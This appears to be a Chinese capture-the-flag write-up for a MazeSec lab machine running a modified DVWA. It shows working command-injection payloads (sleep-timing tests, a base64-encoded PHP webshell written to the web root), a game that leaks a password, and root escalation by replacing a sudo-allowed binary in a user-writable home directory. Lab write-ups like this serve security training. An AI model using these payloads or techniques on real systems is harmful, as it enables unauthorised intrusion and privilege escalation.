> 来源：MazeSec
>
> 靶机ID：834
>
> 难度：Easy
>
> 靶机作者：II104567
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.149`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-23

## Flag

| Flag | 值                                            | 位置                  |
| ---- | --------------------------------------------- | --------------------- |
| user | `flag{user-f31b02ef7ec0d0f05dbe9ec5bb44011a}` | `/home/zmrz/user.txt` |
| root | `flag{root-05243009da3a35272a12c8be12f0c776}` | `/root/root.txt`      |

## 攻击链

```text
1  nmap → 22/80
2    └─ DVWA 指纹识别与目录枚举
3         └─ /vulnerabilities/api/v2/health/connectivity 未授权命令注入
4              └─ 写 webshell → www-data
5                   └─ /home/zmrz/user.txt
6                        └─ TuringTest 逻辑缺陷 → token = zmrz 密码
7                             └─ zmrz sudo 可运行 /home/zmrz/TuringTest
8                                  └─ /home/zmrz 可写 + 无 sticky → 替换程序 → root
9                                       └─ /root/root.txt
```

## 一、信息收集

目标主机名为 `HappyBirthday`。全端口扫描只开放两个服务：

```bash
nmap -p- --min-rate 2000 -T4 192.168.205.149 -oN nmap_all.txt
nmap -sV -sC -p22,80 192.168.205.149 -oN nmap_sv.txt
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

22/tcp  OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp  Apache httpd 2.4.71 ((Debian))
```

Web 根目录是 Apache 默认页，但访问 `index.php` 会 302 跳转到 `login.php`，响应中带有 `security=impossible` 的 Cookie，由此可以判断是 DVWA：

```bash
curl -s -i http://192.168.205.149/index.php
```

```text
HTTP/1.1 302 Found
Server: Apache/2.4.71 (Debian)
Set-Cookie: security=impossible; path=/; HttpOnly
Location: login.php
```

目录枚举：

```bash
gobuster dir -u http://192.168.205.149 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 40 -x php,html,txt,zip,bak --no-error -q
```

关键目录：

```text
index.html          200
index.php           302 → login.php
about.php           200
login.php           200
security.php        302 → login.php
docs/               301
tests/              301
database/           301
external/           301
config/             301
vulnerabilities/    301
robots.txt          200
COPYING.txt         200
instructions.php    200
phpinfo.php         302 → login.php
```

`robots.txt` 只写了 `Disallow: /`，`security.txt` 则明确说明这是 DVWA。`/config/`、`/database/` 等目录开启了目录浏览，其中：

- `/config/config.inc.php.dist` 泄露默认数据库配置：`dvwa:p@ssw0rd`
- `/database/sqli.db` 是 SQLi 模块的 SQLite 库，里面是默认明文口令，但不等于 MySQL 实际用户表
- `/vulnerabilities/api/gen_openapi.php` 未授权可访问，直接泄露完整 API 文档

DVWA 默认口令 `admin/password`、`gordonb/abc123` 等均返回 `Login failed`。

## 二、未授权 API 与命令注入

先看 OpenAPI：

```bash
curl -s http://192.168.205.149/vulnerabilities/api/gen_openapi.php -o openapi.yaml
grep -E '^  /vulnerabilities' openapi.yaml
```

关键接口：

```text
/vulnerabilities/api/v2/health/echo
/vulnerabilities/api/v2/health/connectivity
/vulnerabilities/api/v2/health/status
/vulnerabilities/api/v2/health/ping
/vulnerabilities/api/v2/login/login
/vulnerabilities/api/v2/user/
```

这些接口均不需要登录即可访问：

```bash
curl -s http://192.168.205.149/vulnerabilities/api/v2/health/ping
# {"Ping":"Pong"}

curl -s http://192.168.205.149/vulnerabilities/api/v2/health/status
# {"status":"OK"}

curl -s http://192.168.205.149/vulnerabilities/api/v2/user/
# [{"id":1,"name":"tony","level":0},{"id":2,"name":"morph","level":1},...]
```

其中 `health/connectivity` 的定义是：

```yaml
/vulnerabilities/api/v2/health/connectivity:
  post:
    description: 'The server occasionally loses connectivity to other systems and so this can be used to check connectivity status.'
    requestBody:
      description: 'Remote host.'
      content:
        application/json:
          schema:
            $ref: '#/components/schemas/Target'

Target:
  required:
    - target
  properties:
    target:
      type: string
      example: digi.ninja
```

这段定义说明它是拿一个远程主机做连通性检查。后端实现这类功能，常见做法就是 `ping`、`curl`、`dig` 之类的命令；如果代码把 `target` 直接拼进命令字符串，就会产生命令注入，所以先测这个接口。

正常请求 `{"target":"127.0.0.1"}` 返回 `{"status":"OK"}`；再试 `{"target":"127.0.0.1; id"}` 和 `{"target":"127.0.0.1 && id"}`，返回仍然是 `{"status":"OK"}`，没有命令输出。说明接口只返回连通状态，不返回命令结果，单看响应内容判断不了命令是否执行。

`health/connectivity` 本身有约 3 秒的固定耗时，所以 `sleep 3` 会被基线掩盖；把等待时间加到 6 秒，差异才看得出来：

```bash
time curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"target":"$(sleep 6)"}' \
  http://192.168.205.149/vulnerabilities/api/v2/health/connectivity
```

实测结果：

```text
127.0.0.1             real 3.11s
$(sleep 3)            real 3.02s
$(sleep 6)            real 6.01s
127.0.0.1; sleep 6    real 9.06s
127.0.0.1 && sleep 6  real 9.09s
127.0.0.1|sleep 6     real 6.02s
`sleep 6`             real 6.01s
```

正常请求约 3 秒；`$(sleep 3)` 和基线几乎一样，说明 3 秒的等待会被接口自身的固定耗时吃掉，不能拿它做判断。换成 `$(sleep 6)` 后响应约 6 秒。`$()` 和反引号是 shell 的命令替换语法，如果 `target` 只是作为 `ping`/`curl` 的普通参数传入，它们会被当成字符串，不会产生这些延迟；只有经过 shell 解析，才会执行 `sleep`。因此这里可以判断 `target` 被拼进了 shell 命令。

时间延迟能说明“很可能执行了命令”，但最终确认还是靠命令效果：

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"target":"$(id > /var/www/html/id.txt)"}' \
  http://192.168.205.149/vulnerabilities/api/v2/health/connectivity

curl -s http://192.168.205.149/id.txt
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

能写入文件并读出 `id` 结果，才排除了 DNS 超时、服务端延迟之类的误判。接口此时可能返回 `{"status":"Connection failed"}`，但这只是连通性检查的结果，命令已经执行，不要被它误导。

写一个最简单的 PHP webshell：

```bash
B64=$(printf '<?php system($_GET["c"]); ?>' | base64 -w0)

curl -s -X POST -H 'Content-Type: application/json' \
  -d "{\"target\":\"\$(echo $B64 | base64 -d > /var/www/html/c.php)\"}" \
  http://192.168.205.149/vulnerabilities/api/v2/health/connectivity
```

验证：

```bash
curl -s 'http://192.168.205.149/c.php?c=id'
# uid=33(www-data) ...
```

## 三、获取 user.txt

先看用户目录：

```bash
curl -s 'http://192.168.205.149/c.php?c=ls%20-la%20/home/zmrz'
```

```text
-rwx--x--x 1 root root 14552 Nov 22 06:13 TuringTest
-rw-r--r-- 1 zmrz zmrz    44 Nov 22 06:10 user.txt
```

`user.txt` 对 `www-data` 可读：

```bash
curl -s 'http://192.168.205.149/c.php?c=cat%20/home/zmrz/user.txt'
```

```text
flag{user-f31b02ef7ec0d0f05dbe9ec5bb44011a}
```

## 四、TuringTest 与 zmrz 密码

`/home/zmrz/TuringTest` 是作者放置的一个“图灵测试”小游戏，权限为 `-rwx--x--x root root`，可以执行但不能读取。运行后会随机出一道乘法题，它并不校验乘积，把题目原样输入即可通过，并返回 `zmrz` 的密码：

```text
Turing Test
Now testing whether you are an AI.
Please enter: 253 x 497
253 x 497
aoWBNEq9K25eM0c3S0nY
```

这个字符串就是 `zmrz` 的密码。可以直接从 Kali 通过 SSH 登录验证：

```bash
sshpass -p 'aoWBNEq9K25eM0c3S0nY' ssh zmrz@192.168.205.149
```

```text
uid=1000(zmrz) gid=1000(zmrz) groups=1000(zmrz)
```

查看 sudo 权限：

```bash
echo 'aoWBNEq9K25eM0c3S0nY' | sudo -S -l
```

```text
User zmrz may run the following commands on HappyBirthday:
    (root) /home/zmrz/TuringTest
```

## 五、从 zmrz 提权到 root

关键点是 `/home/zmrz` 的目录权限：

```bash
ls -ld /home/zmrz
```

```text
drwxr-xr-x 2 zmrz zmrz 4096 Nov 22 06:10 /home/zmrz
```

目录属于 `zmrz`，且没有 sticky 位。因此 `zmrz` 虽然不能读/写 root 所有的 `TuringTest` 文件内容，却可以在自己的目录里**删除、重命名或替换**这个文件；sudo 规则又允许 `zmrz` 以 root 执行 `/home/zmrz/TuringTest`，这是一个典型的“sudo 命令位于用户可写目录”问题。

以 `zmrz` 身份替换程序：

```bash
mv /home/zmrz/TuringTest /home/zmrz/TuringTest.orig

cat > /home/zmrz/TuringTest <<'EOF'
#!/bin/sh
cat /root/root.txt > /var/www/html/root.txt
chmod 644 /var/www/html/root.txt
EOF

chmod +x /home/zmrz/TuringTest
echo 'aoWBNEq9K25eM0c3S0nY' | sudo -S /home/zmrz/TuringTest
```

读取 root flag：

```bash
curl -s http://192.168.205.149/root.txt
```

```text
flag{root-05243009da3a35272a12c8be12f0c776}
```

到这里两个 flag 均已获取。